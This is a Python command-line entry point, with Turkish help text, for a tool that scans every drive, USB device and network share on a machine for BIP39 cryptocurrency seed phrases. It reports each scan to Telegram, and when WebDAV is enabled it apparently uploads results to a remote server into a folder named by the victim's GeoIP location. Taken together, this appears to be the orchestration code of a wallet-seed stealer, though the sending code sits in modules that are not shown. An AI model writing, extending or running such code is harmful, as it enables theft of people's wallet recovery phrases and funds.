"""Command-line entry point."""

import argparse
import sys
import time
from pathlib import Path

from .config import WEBDAV_ENABLED, WEBDAV_URL
from .discovery import (
    EXCLUDED_FOLDER_NAMES, IGNORE_FILENAME, get_default_scan_paths, load_ignore_file,
)
from .geoip import get_upload_folder_name
from .reporting import print_console_report
from .scanner import run_scan
from .telegram import (
    telegram_notify_scan_completed, telegram_notify_scan_started,
    telegram_notify_webdav_error, telegram_test,
)
from .webdav import webdav_test_connection

def main():
    parser = argparse.ArgumentParser(
        description="Scanner - BIP39 seed phrase tarama aracı"
    )
    parser.add_argument(
        "--path", action="append", dest="paths",
        help="Taranacak klasör (birden fazla kez kullanılabilir). "
             "Belirtilmezse sistemdeki tüm sürücüler (iç disk, USB/harici "
             "disk, ağ sürücüleri) VE daha önce bağlanılmış ağ konumları "
             "otomatik taranır (sistem/program klasörleri atlanır). "
             "Hiç bağlanılmamış bir ağ paylaşımı için UNC yolu elle "
             "verilebilir (örn. --path \\\\sunucu\\paylasim)."
    )
    parser.add_argument(
        "--no-docx", action="store_true",
        help=".docx/.doc dosyalarını tarama"
    )
    parser.add_argument(
        "--exclude", action="append", dest="extra_excludes", default=[],
        help="Ek olarak dışlanacak klasör adı (birden fazla kez kullanılabilir, "
             "örn. --exclude Backup --exclude \"Eski Projeler\"). "
             "Varsayılan sistem/program klasörü listesine eklenir. "
             f"Kalıcı liste için script yanına '{IGNORE_FILENAME}' dosyası "
             "oluşturup her satıra bir klasör adı yazabilirsiniz."
    )
    args = parser.parse_args()

    # Telegram bağlantısını her zaman ilk önce doğrula (WebDAV'dan bağımsız)
    telegram_test()

    # WebDAV aktifse tarama başlamadan önce bağlantıyı test et
    if WEBDAV_ENABLED:
        ok, err = webdav_test_connection()
        if not ok:
            telegram_notify_webdav_error("Bağlantı Testi Başarısız", err)
            sys.exit(1)
        folder = get_upload_folder_name()

    # Kullanıcının kendi belirttiği ek dışlama isimlerini genel listeye ekle
    for extra in args.extra_excludes:
        EXCLUDED_FOLDER_NAMES.add(extra.lower())

    # Script yanındaki scanner_ignore.txt dosyasından kalıcı
    # dışlama listesini oku (varsa) ve genel listeye ekle
    ignore_file_entries = load_ignore_file()
    if ignore_file_entries:
        for entry in ignore_file_entries:
            EXCLUDED_FOLDER_NAMES.add(entry.lower())

    if args.paths:
        scan_paths = [Path(p) for p in args.paths]
    else:
        scan_paths = get_default_scan_paths()
        if not scan_paths:
            sys.exit(1)

    # Tarama başlangıç bildirimini gönder
    telegram_notify_scan_started(scan_paths)

    _scan_t0 = time.monotonic()
    results, key_results, scanned_count, upload_stats = run_scan(
        scan_paths,
        include_docx=not args.no_docx,
        verbose=True,
    )
    _scan_elapsed = time.monotonic() - _scan_t0

    print_console_report(results, key_results)

    telegram_notify_scan_completed(
        results, key_results, scanned_count, _scan_elapsed, upload_stats
    )



if __name__ == "__main__":
    main()
